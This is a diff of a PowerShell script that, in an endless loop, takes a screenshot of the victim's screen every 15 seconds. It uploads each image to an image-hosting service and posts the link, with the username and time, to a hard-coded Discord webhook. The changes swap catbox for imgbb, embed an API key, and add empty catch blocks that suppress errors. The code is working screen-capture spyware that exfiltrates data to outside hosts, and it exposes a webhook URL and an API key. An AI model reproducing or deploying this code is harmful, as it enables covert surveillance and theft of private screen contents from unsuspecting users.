@@ -1,13 +1,4 @@
-# Check if AWS tools are installed (optional, since we're not using them anymore)
-if (-not (Get-InstalledModule -Name AWS.Tools.Common -ErrorAction SilentlyContinue)) {
-    Install-Module -Name AWS.Tools.Installer -Force -Confirm:$false
-    Install-AWSToolsModule -Name AWS.Tools.Common,AWS.Tools.S3 -CleanUp -Force -Confirm:$false
-}
-
-# Remove the AWS tools import
-# Import-Module -Name AWS.Tools.Common
-# Import-Module -Name AWS.Tools.S3
-
+# dodododo
 function Capture-Screenshot {
     param (
         [string]$OutputFilePath
@@ -26,22 +17,31 @@ function Capture-Screenshot {
     $bmp.Dispose()
 }
 
-function Upload-ToCatbox {
+function Upload-ToImgbb {
     param (
-        [string]$ImageFilePath
+        [string]$ImageFilePath,
+        [string]$ApiKey
     )
 
-    $catboxUrl = "https://catbox.moe/user/api.php"
+    $url = "https://api.imgbb.com/1/upload?key=$ApiKey"
 
     $formData = @{
-        fileToUpload = Get-Item -Path $ImageFilePath
-        reqtype = "fileupload"
+        "image" = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($ImageFilePath))
     }
 
-    $response = Invoke-RestMethod -Uri $catboxUrl -Method Post -Form $formData
-    return $response.url
+    try {
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $formData
+        if ($response.success) {
+            return $response.data.url
+        } else {
+            return $null
+        }
+    } catch {
+        return $null
+    }
 }
 
+# Function to send the Discord message with an image URL
 function Send-DiscordMessage {
     param (
         [string]$WebhookUrl,
@@ -50,10 +50,17 @@ function Send-DiscordMessage {
     )
 
     $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $Message = "User: $UserName at $DateTime - Screenshot: $ImageUrl"
+    $Message = "$UserName at $DateTime $ImageUrl"
 
     $payload = @{
         content = $Message
+        embeds = @(
+            @{
+                image = @{
+                    url = $ImageUrl
+                }
+            }
+        )
     }
 
     $body = $payload | ConvertTo-Json -Depth 5  
@@ -62,15 +69,27 @@ function Send-DiscordMessage {
         'Content-Type' = 'application/json'
     }
 
-    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
+    } catch {
+    }
 }
 
+
 $discordWebhookUrl = "https://discord.com/api/webhooks/1287792562098274315/OpWPJFFOR_DP-FzhglSz6EThsVESr0fHA3LJRtSn-zxRsykRXLfcb-phlqx4zAi8ttYn"
+
+$imgbbApiKey = "21a6327cc8f24b597872c67643973fca"
 
 while ($true) {
     $outputFilePath = "$env:temp\$env:computername-Capture.png"
     Capture-Screenshot -OutputFilePath $outputFilePath
-    $imageUrl = Upload-ToCatbox -ImageFilePath $outputFilePath
-    Send-DiscordMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
+
+    $imageUrl = Upload-ToImgbb -ImageFilePath $outputFilePath -ApiKey $imgbbApiKey
+
+    if ($imageUrl) {
+        Send-DiscordMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
+    } else {
+    }
+
     Start-Sleep -Seconds 15
 }
